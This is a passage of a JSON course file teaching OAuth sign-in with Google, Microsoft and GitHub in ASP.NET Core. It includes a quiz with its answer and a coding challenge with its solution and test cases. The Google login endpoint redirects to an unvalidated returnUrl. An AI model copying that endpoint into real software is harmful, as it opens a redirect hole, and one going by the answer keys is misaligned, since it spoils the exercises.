= GoogleDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/auth/login\";\n    options.LogoutPath = \"/auth/logout\";\n    options.AccessDeniedPath = \"/auth/access-denied\";\n    options.Cookie.Name = \"ShopFlow.Auth\";\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.Cookie.SameSite = SameSiteMode.Lax; // Required for OAuth redirects\n    options.ExpireTimeSpan = TimeSpan.FromDays(14);\n    options.SlidingExpiration = true;\n})\n.AddGoogle(GoogleDefaults.AuthenticationScheme, options =>\n{\n    // Load credentials securely from configuration\n    options.ClientId = builder.Configuration[\"Authentication:Google:ClientId\"] \n        ?? throw new InvalidOperationException(\"Google ClientId not configured\");\n    options.ClientSecret = builder.Configuration[\"Authentication:Google:ClientSecret\"] \n        ?? throw new InvalidOperationException(\"Google ClientSecret not configured\");\n    \n    // Request specific scopes (permissions)\n    options.Scope.Clear(); // Remove defaults if you want explicit control\n    options.Scope.Add(\"openid\");  // Required for OpenID Connect\n    options.Scope.Add(\"email\");   // User's email address\n    options.Scope.Add(\"profile\"); // User's name and picture\n    \n    // Map additional claims from Google's user info\n    options.ClaimActions.MapJsonKey(ClaimTypes.GivenName, \"given_name\");\n    options.ClaimActions.MapJsonKey(ClaimTypes.Surname, \"family_name\");\n    options.ClaimActions.MapJsonKey(\"urn:google:picture\", \"picture\");\n    options.ClaimActions.MapJsonKey(\"urn:google:locale\", \"locale\");\n    options.ClaimActions.MapJsonKey(\"urn:google:email_verified\", \"email_verified\");\n    \n    // Save tokens if you need to call Google APIs later\n    options.SaveTokens = true;\n    \n    // Handle authentication events\n    options.Events = new OAuthEvents\n    {\n        OnCreatingTicket = async context =>\n        {\n            // This fires after successful authentication\n            var email = context.Principal?.FindFirstValue(ClaimTypes.Email);\n            var googleId = context.Principal?.FindFirstValue(ClaimTypes.NameIdentifier);\n            var emailVerified = context.Principal?.FindFirstValue(\"urn:google:email_verified\");\n            \n            var logger = context.HttpContext.RequestServices\n                .GetRequiredService<ILogger<Program>>();\n            \n            logger.LogInformation(\n                \"Google authentication successful for {Email} (ID: {GoogleId}, Verified: {Verified})\",\n                email, googleId, emailVerified);\n            \n            // IMPORTANT: Check if email is verified!\n            if (emailVerified != \"true\" && emailVerified != \"True\")\n            {\n                logger.LogWarning(\"User {Email} has unverified email from Google\", email);\n                // You might want to handle this differently\n            }\n            \n            // Here you would typically:\n            // 1. Look up user in your database by Google ID or email\n            // 2. Create new user if first time\n            // 3. Update last login timestamp\n            // 4. Add custom claims based on your business logic\n            \n            await Task.CompletedTask;\n        },\n        \n        OnRemoteFailure = context =>\n        {\n            // Handle authentication failures gracefully\n            var logger = context.HttpContext.RequestServices\n                .GetRequiredService<ILogger<Program>>();\n            \n            logger.LogError(context.Failure, \"Google authentication failed\");\n            \n            context.Response.Redirect(\"/auth/login?error=google_failed\");\n            context.HandleResponse(); // Prevent default error handling\n            \n            return Task.CompletedTask;\n        }\n    };\n});\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// Login endpoint - initiates Google OAuth flow\napp.MapGet(\"/auth/login\", (string? returnUrl) => \n{\n    var properties = new AuthenticationProperties \n    { \n        RedirectUri = returnUrl ?? \"/\",\n        // Add extra properties for security\n        Items = { { \".xsrf\", Guid.NewGuid().ToString() } }\n    };\n    return Results.Challenge(properties, new[] { GoogleDefaults.AuthenticationScheme });\n});\n\n// Logout endpoint\napp.MapPost(\"/auth/logout\", async (HttpContext context) =>\n{\n    await context.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);\n    return Results.Redirect(\"/\");\n});\n\n// User profile endpoint - returns authenticated user info\napp.MapGet(\"/auth/me\", (ClaimsPrincipal user) =>\n{\n    if (!user.Identity?.IsAuthenticated ?? true)\n    {\n        return Results.Unauthorized();\n    }\n    \n    return Results.Ok(new\n    {\n        Id = user.FindFirstValue(ClaimTypes.NameIdentifier),\n        Email = user.FindFirstValue(ClaimTypes.Email),\n        Name = user.FindFirstValue(ClaimTypes.Name),\n        GivenName = user.FindFirstValue(ClaimTypes.GivenName),\n        FamilyName = user.FindFirstValue(ClaimTypes.Surname),\n        Picture = user.FindFirstValue(\"urn:google:picture\"),\n        EmailVerified = user.FindFirstValue(\"urn:google:email_verified\") == \"true\",\n        Provider = \"Google\"\n    });\n}).RequireAuthorization();\n\napp.Run();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "The OAuth Flow",
              "content": "## The Five Steps of OAuth Authorization Code Flow\n\nWhen a user clicks 'Sign in with Google' in your ShopFlow application, a carefully choreographed dance begins between your application, the user's browser, and Google's servers. Understanding these five steps is essential for debugging authentication issues and implementing secure OAuth.\n\n**Step 1: Redirect to Google**\nYour application redirects the user's browser to Google's authorization endpoint. This URL includes several critical parameters: your CLIENT_ID (identifying your application), the REDIRECT_URI (where Google should send the user back), the SCOPES you are requesting (email, profile), a STATE parameter (random value to prevent CSRF attacks), and RESPONSE_TYPE=code (requesting an authorization code). The user leaves your site entirely and is now on Google's domain.\n\n**Step 2: User Consent**\nGoogle displays a login page if the user is not already signed in, followed by a consent screen. The consent screen shows your application's name, logo, and exactly what permissions you are requesting. The user can see 'ShopFlow wants to view your email address and basic profile information.' They can choose to approve or deny. This happens entirely on Google's secure servers - your application never sees their Google password.\n\n**Step 3: Callback with Authorization Code**\nIf the user approves, Google redirects their browser back to your REDIRECT_URI with two query parameters: CODE (a short-lived authorization code) and STATE (the same value you sent, which you MUST verify matches). The authorization code is NOT an access token - it is a one-time-use ticket that proves the user approved your request. This code expires in about 10 minutes and can only be used once.\n\n**Step 4: Exchange Code for Tokens**\nYour SERVER (not the browser) sends the authorization code to Google's token endpoint, along with your CLIENT_SECRET. This server-to-server communication is crucial - the CLIENT_SECRET must never be exposed to browsers or client-side code. Google validates the code and returns an ACCESS_TOKEN (for calling Google APIs), optionally a REFRESH_TOKEN (for long-term access), and an ID_TOKEN (JWT containing user identity claims).\n\n**Step 5: Extract Claims and Create Session**\nYour application decodes the ID_TOKEN (after verifying its signature) to extract claims about the user: their unique Google ID, email, name, and profile picture. You use this information to either find an existing user in your database or create a new one. Finally, you create a local session cookie so the user remains logged in to your application without repeating this flow on every request.\n\n## Why Authorization Codes?\n\nYou might wonder why we do not just receive an access token directly from Google in step 3. The answer is security through indirection. If tokens were passed through the browser, they could be intercepted by malicious browser extensions, captured in server logs, or stolen via browser history. The authorization code is useless without your CLIENT_SECRET, which only your server knows. Even if someone intercepts the code, they cannot exchange it for tokens.\n\n## The State Parameter Prevents CSRF\n\nThe STATE parameter is your protection against Cross-Site Request Forgery attacks. An attacker could trick a user into clicking a link that looks like a legitimate OAuth callback, potentially linking the attacker's account to the victim's session. By generating a random STATE value, storing it in the user's session, and verifying it matches when the callback arrives, you ensure the callback is genuinely a response to a request YOUR application initiated."
            },
            {
              "type": "WARNING",
              "title": "OAuth Security Considerations",
              "content": "## Critical Security Practices for OAuth Implementation\n\nOAuth is secure when implemented correctly, but small mistakes can create serious vulnerabilities. These are the most important security considerations when integrating Google authentication into ShopFlow.\n\n**Always Verify the State Parameter**\nThe state parameter prevents Cross-Site Request Forgery (CSRF) attacks. When initiating OAuth, generate a cryptographically random state value, store it in the user's session, and include it in the authorization URL. When Google redirects back, verify the returned state matches exactly. ASP.NET Core's OAuth middleware handles this automatically, but if you ever implement custom OAuth flows, this verification is mandatory. An attacker who tricks a user into clicking a crafted callback URL could otherwise hijack authentication.\n\n**Use PKCE for Public Clients**\nIf you're building a mobile app, desktop application, or single-page application (SPA), you MUST implement PKCE (Proof Key for Code Exchange, pronounced 'pixie'). PKCE adds an additional layer of protection by generating a code_verifier and code_challenge. Without PKCE, authorization codes could be intercepted and used by attackers. For server-rendered web applications like ShopFlow's backend, the CLIENT_SECRET provides equivalent protection, but PKCE is still recommended as defense in depth.\n\n**Never Exchange Tokens on the Client**\nThe token exchange (step 4) MUST happen server-to-server. Your CLIENT_SECRET is called a 'secret' for a reason - if it is ever exposed to browsers, mobile apps, or client-side JavaScript, attackers can impersonate your application entirely. They could create a phishing site that looks legitimate to users because it has valid OAuth credentials. There is no recovery from a leaked CLIENT_SECRET except rotating credentials and hoping users have not been compromised.\n\n**Check email_verified Before Trusting Email Claims**\nNot all Google accounts have verified email addresses. While Google typically requires email verification, there are edge cases (accounts created through specific flows, old accounts, organizational accounts) where email_verified might be false. If you automatically link accounts based on email address, an attacker could create a Google account with someone else's unverified email and gain access to their ShopFlow account. Always check the email_verified claim and handle unverified emails appropriately - either require additional verification or refuse to link the account.\n\n**Validate Token Signatures**\nID tokens are JWTs (JSON Web Tokens) signed by Google's private key. Before trusting any claims in the token, verify the signature using Google's public keys (available at their JWKS endpoint). Also validate the token's audience matches your CLIENT_ID (preventing tokens meant for other applications from being accepted), the issuer is Google, and the token has not expired. ASP.NET Core's Google authentication middleware handles this automatically, but understanding it helps you avoid security issues when working with tokens directly.\n\n**Store Tokens Securely**\nIf you save access tokens or refresh tokens (for calling Google APIs later), encrypt them in your database. Refresh tokens are particularly sensitive because they provide long-term access. A database breach that exposes unencrypted tokens would allow attackers to access users' Google resources even after you rotate your OAuth credentials.\n\n**Implement Token Revocation Checking**\nUsers can revoke your application's access through their Google Account settings at any time. Consider periodically validating that saved tokens are still valid, especially before performing sensitive operations on behalf of users."
            }
          ],
          "challenges": [
            {
              "type": "QUIZ",
              "id": "lesson-21-02-challenge-01",
              "title": "OAuth Security Knowledge Check",
              "description": "Test your understanding of OAuth security best practices.",
              "question": "Where should the OAuth client_secret be stored in a production ASP.NET Core application?",
              "options": [
                {
                  "id": "a",
                  "text": "In appsettings.json committed to source control"
                },
                {
                  "id": "b",
                  "text": "In a JavaScript constant for the frontend to use"
                },
                {
                  "id": "c",
                  "text": "In Azure Key Vault, AWS Secrets Manager, or environment variables on the server"
                },
                {
                  "id": "d",
                  "text": "Embedded directly in the compiled DLL for security"
                }
              ],
              "correctAnswer": "c",
              "explanation": "The client_secret must NEVER be exposed to client-side code or committed to source control. In production, secrets should be stored in secure vaults like Azure Key Vault, AWS Secrets Manager, HashiCorp Vault, or at minimum in server environment variables. The application retrieves these secrets at runtime. Options A and D expose secrets in your codebase, and option B would expose the secret to anyone who views your website's JavaScript - all of which would allow attackers to impersonate your application in OAuth flows.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-21-03",
          "title": "Microsoft and GitHub Authentication",
          "moduleId": "module-21",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Different Providers, Same Pattern",
              "content": "Imagine walking down a street with multiple coffee shops, each with their own loyalty program. Starbucks has a green card with stars for points. Dunkin has an orange card with DD Perks. Peet's has a brown card with Peetnik Rewards. Each card looks completely different - different colors, different logos, different point systems - but they all follow the same fundamental pattern: you present the card, they scan it, and you get credit for your purchase.\n\nOAuth providers work exactly the same way. Google, Microsoft, and GitHub are like different coffee shop chains. Each has its own branding, its own developer console, its own specific configuration quirks. Google has the Cloud Console with its project-based organization. Microsoft has the Azure Portal with app registrations and complex tenant configurations. GitHub has a simple OAuth Apps page under Developer Settings.\n\nBut underneath these superficial differences, they all implement the same OAuth 2.0 and OpenID Connect protocols - the same authorization code flow, the same token exchange, the same basic claims about user identity. Just as you know that every loyalty card will be scanned at checkout regardless of which coffee shop you are in, every OAuth provider will redirect users to an authorization page, collect consent, and return an authorization code to your callback URL.\n\nThis means that once you truly understand how Google authentication works, adding Microsoft and GitHub is remarkably straightforward. You are not learning three completely different systems - you are learning one system with three different branding skins. The configuration properties are nearly identical: ClientId, ClientSecret, scopes, callback URL. The claims you receive are the same types: name, email, unique identifier. The security considerations are universal: protect your client secret, verify state parameters, validate tokens.\n\nThe real skill is recognizing this pattern and building your application to treat all providers uniformly. Your user database should not care whether someone authenticated via Google or Microsoft - it should see a verified identity with an email and name. Your authorization logic should not have special cases for GitHub users versus Google users. Build a provider-agnostic system, and adding the fourth, fifth, or tenth OAuth provider becomes a configuration change rather than an architectural overhaul."
            },
            {
              "type": "EXAMPLE",
              "title": "Adding Microsoft Authentication",
              "content": "Microsoft authentication is commonly used in enterprise environments where organizations use Azure Active Directory. Here is how to configure it for ShopFlow.",
              "code": "// ===== AZURE AD APP REGISTRATION =====\n// 1. Go to https://portal.azure.com/\n// 2. Navigate to Azure Active Directory > App registrations\n// 3. Click 'New registration'\n// 4. Configure:\n//    - Name: 'ShopFlow'\n//    - Supported account types: Choose based on your needs:\n//      - 'Single tenant': Only users from your organization\n//      - 'Multi-tenant': Users from any Azure AD organization\n//      - 'Multi-tenant + personal': Azure AD + personal Microsoft accounts\n//    - Redirect URI: Web > https://localhost:5001/signin-microsoft\n// 5. Note the Application (client) ID\n// 6. Go to 'Certificates & secrets' > 'New client secret'\n// 7. Note the secret value (only shown once!)\n\n// ===== NUGET PACKAGE =====\n// dotnet add package Microsoft.AspNetCore.Authentication.MicrosoftAccount\n\n// ===== PROGRAM.CS =====\nusing Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.MicrosoftAccount;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/auth/login\";\n    options.Cookie.Name = \"ShopFlow.Auth\";\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.ExpireTimeSpan = TimeSpan.FromDays(14);\n})\n.AddMicrosoftAccount(MicrosoftAccountDefaults.AuthenticationScheme, options =>\n{\n    options.ClientId = builder.Configuration[\"Authentication:Microsoft:ClientId\"]\n        ?? throw new InvalidOperationException(\"Microsoft ClientId not configured\");\n    options.ClientSecret = builder.Configuration[\"Authentication:Microsoft:ClientSecret\"]\n        ?? throw new InvalidOperationException(\"Microsoft ClientSecret not configured\");\n    \n    // For multi-tenant apps, this allows any Azure AD tenant\n    // For single-tenant, use your specific tenant ID\n    options.AuthorizationEndpoint = \"https://login.microsoftonline.com/common/oauth2/v2.0/authorize\";\n    options.TokenEndpoint = \"https://login.microsoftonline.com/common/oauth2/v2.0/token\";\n    \n    // Request specific scopes\n    options.Scope.Add(\"email\");\n    options.Scope.Add(\"profile\");\n    options.Scope.Add(\"openid\");\n    \n    // Save tokens if you need to call Microsoft Graph API\n    options.SaveTokens = true;\n    \n    // Map additional claims\n    options.ClaimActions.MapJsonKey(ClaimTypes.GivenName, \"givenName\");\n    options.ClaimActions.MapJsonKey(ClaimTypes.Surname, \"surname\");\n    options.ClaimActions.MapJsonKey(\"urn:microsoft:picture\", \"picture\");\n    \n    options.Events.OnCreatingTicket = async context =>\n    {\n        var logger = context.HttpContext.RequestServices\n            .GetRequiredService<ILogger<Program>>();\n        \n        var email = context.Principal?.FindFirstValue(ClaimTypes.Email);\n        var tenantId = context.Principal?.FindFirstValue(\n            \"http://schemas.microsoft.com/identity/claims/tenantid\");\n        \n        logger.LogInformation(\n            \"Microsoft authentication for {Email} from tenant {TenantId}\",\n            email, tenantId ?? \"personal\");\n        \n        // For enterprise apps, you might validate tenant ID\n        // to ensure only your organization's users can access\n        \n        await Task.CompletedTask;\n    };\n});\n\nbuilder.Services.AddAuthorization();\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// Login with Microsoft\napp.MapGet(\"/auth/login/microsoft\", () => Results.Challenge(\n    new AuthenticationProperties { RedirectUri = \"/\" },\n    new[] { MicrosoftAccountDefaults.AuthenticationScheme }));\n\napp.Run();\n\n// ===== APPSETTINGS.JSON (Development only - use secrets in production!) =====\n// {\n//   \"Authentication\": {\n//     \"Microsoft\": {\n//       \"ClientId\": \"your-application-client-id\",\n//       \"ClientSecret\": \"your-client-secret-value\"\n//     }\n//   }\n// }",
              "language": "csharp"
            },
            {
              "type": "EXAMPLE",
              "title": "Adding GitHub Authentication",
              "content": "GitHub authentication is popular for developer-focused applications. GitHub uses OAuth 2.0 but not OpenID Connect, so the claims structure is slightly different.",
              "code": "// ===== GITHUB OAUTH APP SETUP =====\n// 1. Go to https://github.com/settings/developers\n// 2. Click 'OAuth Apps' > 'New OAuth App'\n// 3. Configure:\n//    - Application name: 'ShopFlow'\n//    - Homepage URL: https://shopflow.example.com\n//    - Authorization callback URL: https://localhost:5001/signin-github\n// 4. Click 'Register application'\n// 5. Note the Client ID\n// 6. Click 'Generate a new client secret'\n// 7. Note the secret (only shown once!)\n\n// ===== NUGET PACKAGE =====\n// dotnet add package AspNet.Security.OAuth.GitHub\n// Note: This is a community package as there's no official Microsoft package\n\n// ===== PROGRAM.CS WITH GITHUB =====\nusing Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing AspNet.Security.OAuth.GitHub;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/auth/login\";\n    options.Cookie.Name = \"ShopFlow.Auth\";\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.ExpireTimeSpan = TimeSpan.FromDays(14);\n})\n.AddGitHub(GitHubAuthenticationDefaults.AuthenticationScheme, options =>\n{\n    options.ClientId = builder.Configuration[\"Authentication:GitHub:ClientId\"]\n        ?? throw new InvalidOperationException(\"GitHub ClientId not configured\");\n    options.ClientSecret = builder.Configuration[\"Authentication:GitHub:ClientSecret\"]\n        ?? throw new InvalidOperationException(\"GitHub ClientSecret not configured\");\n    \n    // GitHub-specific scopes\n    options.Scope.Add(\"user:email\");  // Access user's email (even if private)\n    options.Scope.Add(\"read:user\");   // Access user profile info\n    \n    // Optional: Access user's repositories (if needed for your app)\n    // options.Scope.Add(\"repo\");\n    \n    options.SaveTokens = true;\n    \n    // Map GitHub-specific claims\n    options.ClaimActions.MapJsonKey(\"urn:github:login\", \"login\");  // GitHub username\n    options.ClaimActions.MapJsonKey(\"urn:github:url\", \"html_url\"); // GitHub profile URL\n    options.ClaimActions.MapJsonKey(\"urn:github:avatar\", \"avatar_url\");\n    options.ClaimActions.MapJsonKey(\"urn:github:company\", \"company\");\n    options.ClaimActions.MapJsonKey(\"urn:github:bio\", \"bio\");\n    \n    options.Events.OnCreatingTicket = async context =>\n    {\n        var logger = context.HttpContext.RequestServices\n            .GetRequiredService<ILogger<Program>>();\n        \n        var githubUsername = context.Principal?.FindFirstValue(\"urn:github:login\");\n        var email = context.Principal?.FindFirstValue(ClaimTypes.Email);\n        \n        logger.LogInformation(\n            \"GitHub authentication for @{Username} ({Email})\",\n            githubUsername, email ?? \"no email\");\n        \n        // Note: GitHub email might be null if user has private email\n        // You may need to fetch it via the API using the access token\n        if (string.IsNullOrEmpty(email) && context.AccessToken != null)\n        {\n            // Fetch primary email from GitHub API\n            var client = new HttpClient();\n            client.DefaultRequestHeaders.Add(\"Authorization\", $\"Bearer {context.AccessToken}\");\n            client.DefaultRequestHeaders.Add(\"User-Agent\", \"ShopFlow\");\n            \n            try\n            {\n                var response = await client.GetAsync(\"https://api.github.com/user/emails\");\n                if (response.IsSuccessStatusCode)\n                {\n                    var emails = await response.Content\n                        .ReadFromJsonAsync<List<GitHubEmail>>();\n                    var primaryEmail = emails?.FirstOrDefault(e => e.Primary && e.Verified);\n                    \n                    if (primaryEmail != null)\n                    {\n                        // Add email claim manually\n                        var identity = context.Principal?.Identity as ClaimsIdentity;\n                        identity?.AddClaim(new Claim(ClaimTypes.Email, primaryEmail.Email));\n                        \n                        logger.LogInformation(\n                            \"Retrieved primary email {Email} from GitHub API\",\n                            primaryEmail.Email);\n                    }\n                }\n            }\n            catch (Exception ex)\n            {\n                logger.LogWarning(ex, \"Failed to fetch email from GitHub API\");\n            }\n        }\n    };\n});\n\nbuilder.Services.AddAuthorization();\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// Login with GitHub\napp.MapGet(\"/auth/login/github\", () => Results.Challenge(\n    new AuthenticationProperties { RedirectUri = \"/\" },\n    new[] { GitHubAuthenticationDefaults.AuthenticationScheme }));\n\napp.Run();\n\n// Helper class for deserializing GitHub email response\npublic record GitHubEmail(\n    string Email,\n    bool Primary,\n    bool Verified,\n    string? Visibility);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Multi-Provider Strategy",
              "content": "## Building a Provider-Agnostic Authentication System\n\nWhen your application supports multiple OAuth providers, you need a strategy that treats all providers uniformly while handling their differences gracefully. The goal is a clean abstraction where your business logic does not care whether a user authenticated via Google, Microsoft, or GitHub.\n\n**Common Claims Mapping**\n\nEach provider returns claims in slightly different formats. Google might return email as ClaimTypes.Email, while GitHub returns it from an API call. Your first challenge is normalizing these into a consistent internal format.\n\nCreate a standardized set of claims that your application understands:\n- `sub` or `user_id`: The unique identifier for the user\n- `email`: The user's email address (verified when possible)\n- `name`: Display name\n- `picture`: Profile picture URL\n- `provider`: Which OAuth provider authenticated this user\n- `provider_id`: The user's ID at that specific provider\n\nThe OnCreatingTicket event in each provider's configuration is your opportunity to transform provider-specific claims into your standardized format. Add custom claims, merge data from API calls, and ensure consistent claim types across providers.\n\n**The External Logins Pattern**\n\nYour database should separate user identity from authentication method. A single ShopFlow user might authenticate via multiple providers. The standard pattern uses two related tables:\n\n```\nUsers Table:\n- Id (your internal user ID)\n- Email\n- DisplayName\n- CreatedAt\n- LastLoginAt\n\nExternalLogins Table:\n- UserId (FK to Users)\n- Provider (\"Google\", \"Microsoft\", \"GitHub\")\n- ProviderKey (the user's ID at that provider)\n- CreatedAt\n```\n\nWhen a user authenticates, you look up the ExternalLogins table by (Provider, ProviderKey). If found, you know which local user this is. If not found, either create a new user or prompt them to link to an existing account.\n\n**Handling Email Collisions**\n\nThe trickiest scenario: a user signs in with GitHub using the same email as an existing Google user. Are they the same person? Maybe. They could also be an attacker who registered a GitHub account with someone else's email address.\n\nSafe approaches:\n1. **Require explicit linking**: If email matches but provider is new, require the user to prove ownership by also signing in with the existing provider\n2. **Trust verified emails only**: Only consider auto-linking if both providers report email_verified = true\n3. **Never auto-link**: Always create separate accounts; let users manually link them while authenticated\n\nThe most secure option is explicit linking, but it creates friction. Choose based on your security requirements and threat model.\n\n**Unified Login Page Design**\n\nPresent all authentication options clearly. Common patterns:\n- Social login buttons prominently displayed (Sign in with Google, Microsoft, GitHub)\n- Clear visual hierarchy - primary providers larger or first\n- Consistent button styling following each provider's brand guidelines\n- Optional: traditional email/password form for users who prefer it\n\nAvoid overwhelming users with too many options. If you support 10 providers, consider showing the top 3-4 and hiding others under 'More options'."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-21-03-challenge-01",
              "title": "Add a Third OAuth Provider",
              "description": "Extend the authentication system to support Twitter (X) OAuth authentication.",
              "instructions": "Add Twitter (X) as a third OAuth provider to ShopFlow!\n\nYour implementation should:\n\n1. Install the appropriate NuGet package:\n   - Use AspNet.Security.OAuth.Twitter\n\n2. Configure Twitter authentication with:\n   - ClientId and ClientSecret from configuration\n   - Request 'users.read' and 'tweet.read' scopes\n   - Map claims for Twitter username and profile image\n   - SaveTokens = true\n\n3. Add appropriate claim mappings:\n   - Map 'username' to 'urn:twitter:username'\n   - Map 'profile_image_url' to 'urn:twitter:avatar'\n\n4. Create login endpoint:\n   - GET /auth/login/twitter that initiates Twitter OAuth\n\n5. Handle the OnCreatingTicket event:\n   - Log the Twitter username\n   - Add the provider name as a claim\n\nRemember: Twitter uses OAuth 2.0 with PKCE for public clients, but the ASP.NET Core package handles this.",
              "starterCode": "using Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\n// TODO: Add Twitter authentication using statement\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/auth/login\";\n    options.Cookie.Name = \"ShopFlow.Auth\";\n    options.Cookie.HttpOnly = true;\n    options.ExpireTimeSpan = TimeSpan.FromDays(14);\n})\n// TODO: Add Twitter authentication\n// Configure:\n// - ClientId from Configuration[\"Authentication:Twitter:ClientId\"]\n// - ClientSecret from Configuration[\"Authentication:Twitter:ClientSecret\"]\n// - Add scopes: users.read, tweet.read\n// - SaveTokens = true\n// - Map claims: username -> urn:twitter:username\n// - Map claims: profile_image_url -> urn:twitter:avatar\n// - OnCreatingTicket: log the username and add provider claim\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// TODO: Add GET /auth/login/twitter endpoint\n\napp.Run();",
              "solution": "using Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing AspNet.Security.OAuth.Twitter;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n})\n.AddCookie(options =>\n{\n    options.LoginPath = \"/auth/login\";\n    options.Cookie.Name = \"ShopFlow.Auth\";\n    options.Cookie.HttpOnly = true;\n    options.ExpireTimeSpan = TimeSpan.FromDays(14);\n})\n.AddTwitter(TwitterAuthenticationDefaults.AuthenticationScheme, options =>\n{\n    options.ClientId = builder.Configuration[\"Authentication:Twitter:ClientId\"]\n        ?? throw new InvalidOperationException(\"Twitter ClientId not configured\");\n    options.ClientSecret = builder.Configuration[\"Authentication:Twitter:ClientSecret\"]\n        ?? throw new InvalidOperationException(\"Twitter ClientSecret not configured\");\n    \n    options.Scope.Add(\"users.read\");\n    options.Scope.Add(\"tweet.read\");\n    \n    options.SaveTokens = true;\n    \n    options.ClaimActions.MapJsonKey(\"urn:twitter:username\", \"username\");\n    options.ClaimActions.MapJsonKey(\"urn:twitter:avatar\", \"profile_image_url\");\n    \n    options.Events.OnCreatingTicket = async context =>\n    {\n        var logger = context.HttpContext.RequestServices\n            .GetRequiredService<ILogger<Program>>();\n        \n        var username = context.Principal?.FindFirstValue(\"urn:twitter:username\");\n        logger.LogInformation(\"Twitter authentication for @{Username}\", username);\n        \n        var identity = context.Principal?.Identity as ClaimsIdentity;\n        identity?.AddClaim(new Claim(\"auth_provider\", \"Twitter\"));\n        \n        await Task.CompletedTask;\n    };\n});\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapGet(\"/auth/login/twitter\", () => Results.Challenge(\n    new AuthenticationProperties { RedirectUri = \"/\" },\n    new[] { TwitterAuthenticationDefaults.AuthenticationScheme }));\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should add Twitter authentication",
                  "expectedOutput": "AddTwitter",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should request users.read scope",
                  "expectedOutput": "users.read",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should map username claim",
                  "expectedOutput": "urn:twitter:username",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should create login endpoint",
                  "expectedOutput": "/auth/login/twitter",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Import the Twitter authentication namespace: using AspNet.Security.OAuth.Twitter;"
                },
                {
                  "level": 2,
                  "text": "Use .AddTwitter(TwitterAuthenticationDefaults.AuthenticationScheme, options => { ... }) to configure Twitter."
                },
                {
                  "level": 3,
                  "text": "Add scopes with options.Scope.Add(\"users.read\") and options.Scope.Add(\"tweet.read\")."
                },
                {
                  "level": 4,
                  "text": "Map claims with options.ClaimActions.MapJsonKey(\"urn:twitter:username\", \"username\")."
                },
                {
                  "level": 5,
                  "text": "In OnCreatingTicket, cast context.Principal?.Identity to ClaimsIdentity to add custom claims."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using the wrong authentication scheme constant",
                  "consequence": "The challenge will fail because the scheme name doesn't match the configured authentication.",
                  "correction": "Use TwitterAuthenticationDefaults.AuthenticationScheme to ensure consistency."
                },
                {
                  "mistake": "Forgetting to add the using statement for the Twitter namespace",
                  "consequence": "Compiler errors for unrecognized types like TwitterAuthenticationDefaults.",
                  "correction": "Add 'using AspNet.Security.OAuth.Twitter;' at the top of the file."
                },
                {
                  "mistake": "Not handling null configuration values",
                  "consequence": "Runtime NullReferenceException when configuration is missing.",
                  "correction": "Use null-coalescing with throw: Configuration[\"key\"] ?? throw new InvalidOperationException(\"...\")."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-21-04",
          "title": "Linking External Logins to Local Accounts",
          "moduleId": "module-21",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Multiple Keys to the Same House",
